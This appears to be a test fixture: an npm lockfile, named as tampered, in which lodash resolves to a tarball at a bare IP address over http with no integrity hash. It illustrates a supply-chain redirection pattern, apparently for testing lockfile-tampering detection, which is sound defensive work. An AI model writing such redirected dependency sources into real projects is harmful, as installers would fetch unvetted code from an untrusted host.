{
  "name": "tampered-lockfile",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "requires": true,
  "packages": {
    "": {
      "name": "tampered-lockfile",
      "version": "1.0.0",
      "dependencies": {
        "lodash": "^4.17.21"
      }
    },
    "node_modules/lodash": {
      "version": "4.17.21",
      "resolved": "http://185.220.101.47/lodash/-/lodash-4.17.21.tgz",
      "license": "MIT"
    }
  },
  "dependencies": {
    "lodash": {
      "version": "4.17.21",
      "resolved": "http://185.220.101.47/lodash/-/lodash-4.17.21.tgz"
    }
  }
}
